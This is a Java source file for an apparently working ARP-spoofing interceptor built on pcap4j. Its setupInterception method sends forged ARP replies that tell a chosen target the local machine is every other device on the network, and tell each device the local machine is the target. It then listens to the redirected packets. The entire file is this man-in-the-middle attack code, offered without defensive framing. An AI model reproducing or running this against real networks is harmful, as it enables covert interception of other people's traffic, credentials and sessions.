package interceptor;

import network.INetwork;
import network.NetworkFactory;
import network.device.LocalNetworkDevice;
import network.device.RemoteNetworkDevice;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpOperation;
import packet.builder.IPacketBuilder;
import packet.builder.PacketBuilderFactory;
import packet.listener.IPacketListenerImpl;
import packet.listener.PacketListenerImplFactory;
import packet.sender.IPacketSender;
import packet.sender.PacketSenderFactory;

import java.util.ArrayList;

public class Interceptor implements IInterceptor {
    RemoteNetworkDevice target;

    @Override
    public void intercept(RemoteNetworkDevice device) {
        target = device;
        setupInterception();

        IPacketListenerImpl listener = PacketListenerImplFactory.PacketListenerImpl();
        listener.startListening();
    }

    private void setupInterception() {
        INetwork network = NetworkFactory.getNetwork();
        ArrayList<RemoteNetworkDevice> remoteDevices = network.getDevices();
        IPacketSender sender = PacketSenderFactory.getPacketSender();
        IPacketBuilder packetBuilder = PacketBuilderFactory.getPacketBuilder();

        ArpOperation operation = ArpOperation.REPLY;
        String srcMac;
        String srcIP;
        String dstMac;
        String dstIP;

        for (RemoteNetworkDevice device : remoteDevices) {

            // Tell target I am every device
            if (! device.getIp().getHostAddress().equals(target.getIp().getHostAddress())) {

                // Tell target I am device
                srcMac = LocalNetworkDevice.getMac();
                srcIP = device.getIp().getHostAddress();
                dstMac = target.getMacAddress().toString();
                dstIP = target.getIp().getHostAddress();

                Packet packet = packetBuilder.buildArp(operation, srcMac, srcIP, dstMac, dstIP);
                sender.send(packet);

                // Tell device I am target
                srcIP = target.getIp().getHostAddress();
                dstMac = device.getMacAddress().toString();
                dstIP = device.getIp().getHostAddress();

                packet = packetBuilder.buildArp(operation, srcMac, srcIP, dstMac, dstIP);
                sender.send(packet);
            }

        }

    }
}
